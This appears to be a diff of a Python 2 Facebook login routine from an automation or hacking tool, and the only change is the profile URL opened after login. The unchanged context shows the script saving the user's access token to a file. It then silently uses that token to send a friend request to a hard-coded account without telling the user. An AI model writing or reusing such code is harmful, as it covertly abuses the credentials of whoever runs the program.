@@ -195,7 +195,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.facebook.com/Chharry009')
+				os.system('xdg-open https://m.facebook.com/itzfariya786')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
